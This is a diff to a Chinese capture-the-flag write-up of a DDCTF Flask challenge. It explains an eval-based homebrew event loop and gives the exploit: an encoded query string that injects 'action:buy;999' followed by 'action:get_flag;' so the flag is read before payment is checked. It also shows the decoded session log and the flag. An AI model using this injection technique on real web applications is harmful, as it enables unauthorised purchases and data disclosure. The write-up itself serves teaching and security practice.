@@ -161,7 +161,7 @@ if __name__ == '__main__':
     app.run(debug=False, host='0.0.0.0') 
 ```
 
-简单地 review 整个文件，可以得到很明确的目标： **捕获 `FLAG()` 函数的返回值** 。
+首先简单地 review 整个文件，可以得到很明确的目标： **捕获 `FLAG()` 函数的返回值** 。
 
 从唯一一处调用 `FLAG()` 函数的 `get_flag_handler(args)` 快速向上分析：
 1. 必须是在 `session['num_items'] >= 5` 时执行 `get_flag_handler(args)` 才能使 `FLAG()` 函数执行。
@@ -193,7 +193,7 @@ def entry_point():
 ```
 
 1. 接受 QueryString，并作为 `event` 参数调用 `trigger_event(event)`。
-2. Querystring 只允许以 `'action:'` 开头，长度不得超过 100 字符；否则都将被过滤并改为调用 `trigger_event('action:index;False#False')`。
+2. Querystring 只允许以 `'action:'` 开头，长度不得超过 100 字符；否则都将被拦截并改为调用 `trigger_event('action:index;False#False')`。
 3. Session 为空时会自动重置为默认值。
 4. Session 在操作前会先把原值拷贝至当前请求实例中。（应该是作为备份
 5. 此处调用 `trigger_event(event)` 后，会立即调用 `execute_event_loop()`。
@@ -237,7 +237,7 @@ def execute_event_loop():
 ```
 
 1. 不断从请求实例的 `event_queue` 队列中取出最前的一个事件。
-2. 取出的事件会被解析成三段数据：句柄方法类型 (action or function) 、动作名和参数数组；并用这三段数据调用指定的句柄方法 (handler)。（这步相当于自己造路由！
+2. 取出的事件会被解析成三段数据：句柄方法类型、动作名和参数数组；并用这三段数据调用指定的句柄方法 (handler)。（相当于自己造路由！
 3. 当捕获到自定义的回滚异常 (RollBackException) 时，把 session 中的 `num_items` 和 `points` 数据回滚至刚收到请求时的状态。（有必要 ~~，但从设计的角度说，这个操作放在这里稍显不合适~~
 4. 将 handler 执行的结果拼接，并响应回给客户端。
 
@@ -245,7 +245,7 @@ def execute_event_loop():
 点题了！！  
 出题人在这里实现了个 ~~简易的~~ [Event Loop](https://en.wikipedia.org/wiki/Event_loop) ！！！
 
-回顾前面的代码，便能理解 `trigger_event(event)` 的意义： **为 Event Loop 提供推任务入队列的接口** —— 同时也就意味着，这是一个 **异步** 操作。（注意了
+再回顾前面的代码，便能理解 `trigger_event(event)` 的意义： **为 Event Loop 提供推任务入队列的接口** —— 同时也就意味着，这是一个 **异步** 操作。（注意了
 
 接着回到刚才的 `execute_event_loop()` 。在出题人自己造的路由 ~~（homebrew router~~ 里出现了一个 `eval`，用于实现 handler 调用：
 
@@ -373,10 +373,10 @@ console.log(readLogs({"log":[{" b":"YWN0aW9uOnZpZXc7aW5kZXg="},{" b":"YWN0aW9uOn
 
 便成功读到 `trigger_event(event)` 的操作日志。
 
-### Async
+### 最后一环，Async
 现在我们已经能够随意执行 `trigger_event(event)`，并且读取 Cookie-Session 中 `trigger_event(event)` 的执行日志了。结合开头对 `get_flag_handler(args)` 的分析，接下来的目标则是让 `session['num_items'] > 5`，使得 `trigger_event('func:show_flag;' + FLAG())` 被执行。
 
-检查能够使 `session['num_items']` 值增加的方法（也就是购买操作）：
+检查题中购买操作的接口：
 
 ```python
 def buy_handler(args): 
@@ -392,152 +392,171 @@ def consume_point_function(args):
   
 ```
 
-那么逻辑大致是：
+流程大致是：
 ```graphviz
 digraph G {
-    node [shape=record]
-
+    size = 4
 	subgraph cluster_0 {
-		style=filled;
-		color=grey90;
-		node [style=filled,color=white];
-		label = "发货";
-        添加钻石个数;
+		style = "dashed"
+		label = "发货"
+        添加钻石个数
 	}
 
 	subgraph cluster_1 {
-	    style=filled;
-	    color=grey90;
-		node [style=filled, color=white];
-		label = "支付";
-		检查剩余点数;
-		扣除点数;
+		style = "dashed"
+		label = "支付"
+		检查剩余点数 [shape = "diamond"]
+		扣除点数
 	}
 
 	subgraph cluster_2 {
-	    style=filled;
-	    color=grey90;
-		node [style=filled, color=white];
-		label = "回滚";
-		回滚钻石个数;
+		style = "dashed"
+		label = "回滚"
+		回滚钻石个数
 	}
-	
-	开始 -> 添加钻石个数;
-	添加钻石个数 -> 检查剩余点数;
-	检查剩余点数 -> 扣除点数 [label = 足够];
-	扣除点数 -> 交易成功;
-	检查剩余点数 -> 回滚钻石个数 [label = 不足];
-	回滚钻石个数 -> 交易失败;
+
+	开始交易 -> 添加钻石个数
+	添加钻石个数 -> 检查剩余点数 [style = "dashed", color = "red"]
+	检查剩余点数 -> 扣除点数 [label = "足够"]
+	扣除点数 -> 交易成功
+	检查剩余点数 -> 回滚钻石个数 [label = "不足"]
+	回滚钻石个数 -> 交易失败
 }
 ```
+
+这里存在两个问题：
+1. 与实际电商中常见的交易流程不同，这里实现为先发货后支付。
+2. 发货完成后触发支付是通过执行 `trigger_event(event)` 实现，而这是一个异步操作。
+
+那么结合前面的线索，构造出执行 `trigger_event(['action:buy;999', 'action:get_flag;'])` 的链接：
+
+```javascript
+'http://116.85.48.107:5002/d5af31f66147e857/?' + encodeURIComponent('action:trigger_event#;action:buy;999#action:get_flag;')
+// <- "http://116.85.48.107:5002/d5af31f66147e857/?action%3Atrigger_event%23%3Baction%3Abuy%3B999%23action%3Aget_flag%3B"
+```
+
+通过这个链接，我们在任务队列中把 `action:get_flag;` 塞在了支付前，完整的队列也就变成了：
 
 ```graphviz
 digraph g {
+    size = 6
+
     subgraph cluster_0 {
-        label="Entry"
-        node [shape="record"];
-        queue_0_1 [label="<buy> [0] buy(999) | <flag> [1] get_flag()"];
+        label = "Entry"
+        node [shape = "record"]
+        queue_0_1 [label = "<0> [0] buy(999) | <1> [1] get_flag()"]
     }
     
     subgraph cluster_1 {
-        label="Inside"
-        color=transparent;
-        bgcolor=grey99;
+        label = "Inside"
         
         subgraph cluster_1_0 {
-            label=""
-            color=black;
-            trigger_1 [label="push(['consume;999', 'view;index'])"];
-            queue_2_3 [label="[2] consume(999) | [3] view('index')", shape=record];
+            label = ""
+            color = "black"
+            trigger_1 [label = "push(['consume;999', 'view;index'])"]
+            queue_2_3 [label = "[2] consume(999) | [3] view('index')", shape = "record"]
         }
 
         subgraph cluster_1_1 {
-            label=""
-            color=black;
-            trigger_2 [label="push('show_flag(FLAG)')"];
-            queue_4 [label="[4] show_flag(FLAG)", shape=record, color=red];
-            trigger_3 [label="push('view(\"index\")')"];
-            queue_5 [label="[5] view('index')", shape=record];
-        }
-        
-        subgraph cluster_1_2 {
-            label=""
-            color=black;
-        }
-        
-        subgraph cluster_1_4 {
-            label=""
-            color=black;
+            label = ""
+            color = "black"
+            trigger_2 [label = "push('show_flag(FLAG)')"]
+            queue_4 [label = "[4] show_flag(FLAG)", shape = "record", color = "red"]
+            trigger_3 [label = "push('view(\"index\")')"]
+            queue_5 [label = "[5] view('index')", shape = "record"]
         }
     }
     
-    queue_0_1:buy -> trigger_1 -> queue_0_1:flag;
-    trigger_1 -> queue_2_3 [style=dashed];
-    queue_0_1:flag -> trigger_2;
-    trigger_2 -> queue_4 [style=dashed];
-
-    trigger_2 -> trigger_3;
-    trigger_3 -> queue_5 [style=dashed];
+    queue_0_1:0 -> trigger_1 -> queue_0_1:1
+    trigger_1 -> queue_2_3 [style=dashed]
+    queue_0_1:1 -> trigger_2
+    trigger_2 -> queue_4 [style=dashed]
+    trigger_2 -> trigger_3
+    trigger_3 -> queue_5 [style=dashed]
 }
 ```
+
+> 如果难以理解，不妨通过这份 [repeater.py](./repeater.py) 观察输入不同参数时所产生的日志内容；相比原题中的 [serve.py](./vendors/serve.py)，精简后的单例 request 更方便反复调试。
+
+执行流程则变成：
 
 ```graphviz
 digraph G {
-    node [shape=record]
+    size = 7.2
 
 	subgraph cluster_0 {
-		style=filled;
-		color=grey90;
-		node [style=filled,color=white];
-		label = "发货";
-        添加钻石个数;
+		style = "dashed"
+		label = "发货"
+        添加钻石个数
 	}
 
 	subgraph cluster_1 {
-	    style=filled;
-	    color=grey90;
-		node [style=filled, color=white];
-		label = "支付";
-		检查剩余点数;
-		扣除点数;
+		style = "dashed"
+		label = "支付"
+		检查剩余点数 [shape = "diamond"]
+		扣除点数
 	}
 
 	subgraph cluster_2 {
-	    style=filled;
-	    color=grey90;
-		node [style=filled, color=white];
-		label = "回滚";
-		回滚钻石个数;
+		style = "dashed"
+		label = "回滚"
+		回滚钻石个数
 	}
 
 	subgraph cluster_3 {
-		style=filled;
-		color=grey90;
-		node [style=filled,color=white];
-		label = "获取 FLAG";
-        检查钻石个数;
-        读取_FLAG_并推入任务队列;
-        写入_FLAG_至日志;
-        跳过;
+		style = "dashed"
+        color = "red"
+		label = "获取 FLAG"
+        检查钻石个数 [shape = "diamond"]
+        读取_FLAG_并推入任务队列
+        写入_FLAG_至日志
+        跳过
 	}
 	
-	开始 -> 添加钻石个数;
-	添加钻石个数 -> 检查钻石个数;
-	检查钻石个数 -> 读取_FLAG_并推入任务队列 [label=足够];
-	读取_FLAG_并推入任务队列 -> 写入_FLAG_至日志;
-	检查钻石个数 -> 跳过 [label=不足];
-	写入_FLAG_至日志 -> 检查剩余点数;
-	跳过 -> 检查剩余点数;
-	检查剩余点数 -> 扣除点数 [label = 足够];
-	扣除点数 -> 交易成功;
-	检查剩余点数 -> 回滚钻石个数 [label = 不足];
-	回滚钻石个数 -> 交易失败;
+	开始交易 -> 添加钻石个数
+	添加钻石个数 -> 检查钻石个数 [style = "dashed"]
+	检查钻石个数 -> 读取_FLAG_并推入任务队列 [label = "足够"]
+	读取_FLAG_并推入任务队列 -> 写入_FLAG_至日志
+	检查钻石个数 -> 跳过 [label = "不足"]
+	写入_FLAG_至日志 -> 检查剩余点数 [style = "dashed"]
+	跳过 -> 检查剩余点数 [style = "dashed"]
+	检查剩余点数 -> 扣除点数 [label = "足够"]
+	扣除点数 -> 交易成功
+	检查剩余点数 -> 回滚钻石个数 [label = "不足"]
+	回滚钻石个数 -> 交易失败
 }
 ```
+
+最后，解析 Cookie-Session，读取其中的执行日志：
+
+```json
+[
+  "action:trigger_event#;action:buy;999#action:get_flag;",
+  "action:buy;999",
+  "action:get_flag;",
+  "func:consume_point;999",
+  "action:view;index",
+  "func:show_flag;3v41_3v3nt_100p_aNd_fLASK_c00k1e",
+  "action:view;index"
+]
+```
+
+便获得 flag `DDCTF{3v41_3v3nt_100p_aNd_fLASK_c00k1e}` :v:。
+
+### 问题出在哪
+相比这次 web 的其他题目而言，这一题的题目完成度很高，也更贴近实际场景，是很有意思的一题。
+
+题中出现的关键问题有：
+1. 给了客户端执行 `eval` 的机会。
+2. 先发货后支付，并以异步的形式触发。
+3. 在使用 Cookie-Session 的情况下仍然把敏感信息写入了 session。
+
+正是最后 flag 的含义 —— `"eval, event loop and flask cookie"`。
 
 
 ## 涉及资料
 - 源代码
+  - [调试攻击参数](./repeater.js)
   - [完整通关脚本](./index.js)
 - 知识点
   - [Event Loop](https://en.wikipedia.org/wiki/Event_loop)
